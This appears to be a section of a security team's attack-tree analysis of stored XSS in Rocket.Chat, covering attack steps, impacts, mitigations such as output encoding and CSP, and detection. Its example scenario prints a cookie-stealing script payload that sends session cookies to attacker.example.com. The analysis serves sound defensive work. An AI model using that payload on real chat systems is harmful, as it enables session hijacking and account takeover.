### 4. Deep Analysis: 2.1.1. Stored XSS (High-Risk Path)

#### 4.1. Attack Path Description

* **2.1.1. Stored XSS (High-Risk Path)**
    * Likelihood: Medium to High
    * Impact: Moderate to Significant
    * Effort: Low
    * Skill Level: Low
    * Detection Difficulty: Medium
    * Actionable Insight: Inject malicious scripts that are stored in Rocket.Chat database and executed when other users view the content (e.g., in messages, channel topics, usernames).
    * Action: Implement robust input validation and output encoding for all user-generated content. Use Content Security Policy (CSP) to mitigate XSS risks. Regularly scan for XSS vulnerabilities.

#### 4.2. Detailed Breakdown

* **Vulnerability:** Stored Cross-Site Scripting (XSS). This vulnerability arises when user-supplied data is stored on the server (e.g., in a database) and later displayed to other users without proper sanitization or encoding.

* **Threat Actor:**  A malicious user, potentially an insider or an external attacker who has gained access to Rocket.Chat (or its user input mechanisms). The skill level is considered low, meaning even relatively unsophisticated attackers can exploit this vulnerability if it exists.

* **Attack Vector:**  Injection of malicious JavaScript code through user input fields within Rocket.Chat. Common injection points could include:
    * **Messages:**  Within chat messages sent in public channels, private groups, or direct messages.
    * **Channel Topics/Descriptions:** When setting or modifying channel topics or descriptions.
    * **Usernames:** During user registration or profile updates (less common but possible if usernames are not properly handled).
    * **Custom User Fields:** If Rocket.Chat allows administrators to define custom user fields, these could be vulnerable if not correctly sanitized.
    * **File Names/Metadata:**  In less likely scenarios, if file uploads and their metadata are not handled securely, there might be a theoretical Stored XSS risk, though less common in chat applications for direct execution.
    * **Bot Integrations/Webhooks:** If Rocket.Chat integrations or webhooks allow storing and displaying external data without proper sanitization, they could be exploited.

* **Preconditions:**
    * **Vulnerable Input Points:** Rocket.Chat must have input fields that allow users to submit data that is subsequently stored and displayed to other users.
    * **Lack of Input Validation and Output Encoding:** The application must fail to adequately validate user input to prevent malicious scripts from being stored and fail to encode output when displaying stored content, allowing the stored scripts to execute in users' browsers.
    * **User Interaction:**  For the XSS to be triggered, other users must view the content containing the malicious script.

* **Attack Steps:**

    1. **Identify Injection Point:** The attacker identifies a vulnerable input field in Rocket.Chat where they can inject malicious JavaScript code. For example, they might try injecting code into a chat message.
    2. **Craft Malicious Payload:** The attacker crafts a JavaScript payload designed to achieve their malicious objectives. Examples include:
        * Stealing session cookies and sending them to an attacker-controlled server.
        * Redirecting users to a phishing website.
        * Defacing the Rocket.Chat interface for other users.
        * Performing actions on behalf of the victim user (if session cookies are stolen).
        * Potentially attempting to escalate privileges or access sensitive data.
    3. **Inject Payload:** The attacker submits the crafted payload through the identified input field (e.g., sends a chat message containing the malicious script).
    4. **Payload Stored:** Rocket.Chat's backend stores the malicious payload in its database, associated with the user-generated content (e.g., the chat message).
    5. **Victim User Accesses Content:** A legitimate Rocket.Chat user views the content containing the stored malicious payload. This could be by opening a channel, reading a direct message, viewing a user profile, etc.
    6. **Malicious Script Execution:** When the victim's browser renders the page containing the stored content, the malicious JavaScript code is executed within the victim's browser context. This is because the application failed to properly encode the output.
    7. **Impact Realized:** The malicious script performs its intended actions, potentially compromising the victim user's account, data, or system.

#### 4.3. Potential Impact (Detailed)

The impact of a successful Stored XSS attack in Rocket.Chat can range from moderate to significant, as indicated in the attack tree.  Here's a more detailed breakdown of potential impacts:

* **Account Takeover:**  By stealing session cookies or other authentication tokens, an attacker can impersonate a victim user and gain complete control over their Rocket.Chat account. This allows the attacker to:
    * Read private messages and channels.
    * Send messages as the victim user.
    * Modify user profile information.
    * Potentially escalate privileges if the victim is an administrator.
* **Data Theft and Confidentiality Breach:**  Malicious scripts can be used to exfiltrate sensitive data accessible to the victim user, including:
    * Private messages and channel content.
    * User profile information (email addresses, names, etc.).
    * Potentially sensitive data shared within Rocket.Chat.
* **Malware Distribution:**  Attackers can use Stored XSS to inject scripts that redirect users to websites hosting malware or initiate drive-by downloads, potentially infecting victim users' systems.
* **Defacement and Disruption:**  Malicious scripts can alter the visual appearance of Rocket.Chat for victim users, causing disruption and potentially damaging the platform's reputation. This could range from subtle changes to complete defacement.
* **Phishing Attacks:**  Stored XSS can be used to display fake login forms or other phishing content within the legitimate Rocket.Chat interface, tricking users into revealing their credentials or other sensitive information.
* **Denial of Service (Limited):** While not a direct DoS, widespread Stored XSS exploitation could degrade the user experience and potentially overload client-side resources, leading to a form of client-side denial of service.
* **Reputational Damage:**  Successful and publicized Stored XSS attacks can severely damage Rocket.Chat's reputation and user trust.

#### 4.4. Mitigation Strategies (Detailed and Rocket.Chat Specific)

To effectively mitigate Stored XSS vulnerabilities in Rocket.Chat, the development team should implement the following strategies:

* **Robust Input Validation:**
    * **Principle of Least Privilege:** Only accept the necessary characters and formats for each input field.
    * **Whitelist Approach:** Define allowed characters and patterns for each input field (e.g., alphanumeric, specific symbols). Reject any input that does not conform to the whitelist.
    * **Contextual Validation:** Validate input based on its intended use. For example, validate usernames differently from chat messages.
    * **Server-Side Validation:**  Perform input validation on the server-side to ensure that client-side validation can't be bypassed.

* **Output Encoding (Context-Aware Encoding):**
    * **HTML Encoding:** Encode user-generated content before displaying it in HTML contexts. This converts potentially harmful characters (e.g., `<`, `>`, `"`, `'`, `&`) into their HTML entities (e.g., `&lt;`, `&gt;`, `&quot;`, `&#x27;`, `&amp;`).
    * **JavaScript Encoding:** If user-generated content needs to be embedded within JavaScript code (which should be avoided if possible), use JavaScript-specific encoding to prevent script injection.
    * **URL Encoding:** Encode user-generated content when used in URLs to prevent URL-based injection attacks.
    * **Choose the Right Encoding for the Context:**  Select the appropriate encoding method based on where the user-generated content is being displayed (HTML, JavaScript, URL, etc.).

* **Content Security Policy (CSP):**
    * **Implement a Strict CSP:**  Define a strict Content Security Policy to control the sources from which the browser is allowed to load resources (scripts, stylesheets, images, etc.).
    * **`default-src 'self'`:**  Start with a restrictive `default-src 'self'` policy, which only allows resources from the same origin as the Rocket.Chat application.
    * **`script-src` Directive:**  Specifically control the sources of JavaScript execution. Avoid `'unsafe-inline'` and `'unsafe-eval'` if possible. Use nonces or hashes for inline scripts if absolutely necessary.
    * **`object-src`, `style-src`, `img-src`, etc.:**  Configure other CSP directives to further restrict resource loading and reduce the attack surface.
    * **Report-Only Mode:** Initially deploy CSP in report-only mode to monitor policy violations without blocking content, allowing for fine-tuning before enforcement.

* **Regular Security Scanning and Vulnerability Assessments:**
    * **Automated Security Scanners:** Integrate automated security scanners (SAST/DAST) into the development pipeline to regularly scan Rocket.Chat for XSS vulnerabilities.
    * **Penetration Testing:** Conduct periodic penetration testing by security professionals to identify vulnerabilities that automated scanners might miss and to assess the overall security posture.
    * **Vulnerability Disclosure Program:**  Consider implementing a vulnerability disclosure program to encourage security researchers to report potential vulnerabilities responsibly.

* **Security Awareness Training for Developers:**
    * **Educate Developers:**  Provide regular security awareness training to developers on common web application vulnerabilities, including XSS, and secure coding practices.
    * **Code Review Practices:**  Implement mandatory code reviews, focusing on security aspects, to catch potential XSS vulnerabilities before code is deployed.

* **Framework and Library Updates:**
    * **Keep Dependencies Updated:** Regularly update Rocket.Chat's frameworks, libraries, and dependencies to patch known vulnerabilities, including those related to XSS.

#### 4.5. Detection and Monitoring

Detecting and monitoring for Stored XSS vulnerabilities and attacks is crucial.  Here are some methods:

* **Security Information and Event Management (SIEM) Systems:**
    * **Log Analysis:**  Integrate Rocket.Chat logs with a SIEM system to monitor for suspicious activity patterns that might indicate XSS attempts or exploitation.
    * **Anomaly Detection:**  Configure SIEM to detect anomalies in user behavior or application logs that could be related to XSS attacks.

* **Web Application Firewalls (WAF):**
    * **Signature-Based Detection:** WAFs can be configured with signatures to detect known XSS attack patterns in HTTP requests and responses.
    * **Behavioral Analysis:**  More advanced WAFs can use behavioral analysis to detect anomalous requests that might indicate XSS attempts, even if they don't match known signatures.

* **Content Security Policy (CSP) Reporting:**
    * **`report-uri` Directive:** Configure the `report-uri` directive in the CSP to receive reports of policy violations. These reports can help identify potential XSS vulnerabilities and attack attempts.

* **Regular Security Scanning:**  As mentioned in mitigation, regular security scanning is also crucial for detection.

* **User Reporting Mechanisms:**  Provide users with a clear and easy way to report suspicious content or behavior within Rocket.Chat that they suspect might be related to XSS or other security issues.

#### 4.6. Example Scenario

Let's consider a scenario where a malicious user wants to steal session cookies from other Rocket.Chat users in a public channel.

1. **Injection Point:** The attacker identifies that chat messages in public channels are vulnerable to Stored XSS.
2. **Malicious Payload:** The attacker crafts the following JavaScript payload:
   ```javascript
   <script>
     var cookie = document.cookie;
     var img = document.createElement('img');
     img.src = 'https://attacker.example.com/collect_cookie?c=' + encodeURIComponent(cookie);
     document.body.appendChild(img);
   </script>
   ```
   This script attempts to:
     * Read the victim's cookies using `document.cookie`.
     * Create an `<img>` element.
     * Set the `src` attribute of the image to an attacker-controlled server (`attacker.example.com/collect_cookie`) and append the encoded cookies as a query parameter.
     * Append the image to the document body, triggering the browser to make a request to the attacker's server, sending the cookies in the URL.
3. **Inject Payload:** The attacker sends a chat message in a public channel containing this payload: "Check out this cool link: `<script> ... </script>`".
4. **Payload Stored:** Rocket.Chat stores this message in the database.
5. **Victim User Accesses Content:**  Another user opens the public channel and views the attacker's message.
6. **Malicious Script Execution:** The victim's browser renders the message, executes the JavaScript, and sends the session cookies to `attacker.example.com`.
7. **Impact Realized:** The attacker receives the victim's session cookies and can potentially use them to hijack the victim's Rocket.Chat session.

#### 4.7. Conclusion

Stored XSS vulnerabilities represent a significant security risk for Rocket.Chat, as highlighted by the "High-Risk Path" designation in the attack tree.  The potential impact ranges from account takeover and data theft to malware distribution and reputational damage.

Implementing robust mitigation strategies, including input validation, output encoding, CSP, regular security scanning, and developer training, is crucial to protect Rocket.Chat and its users from Stored XSS attacks.  Continuous monitoring and proactive security measures are essential to maintain a secure communication platform. Addressing this attack path should be a high priority for the Rocket.Chat development team.
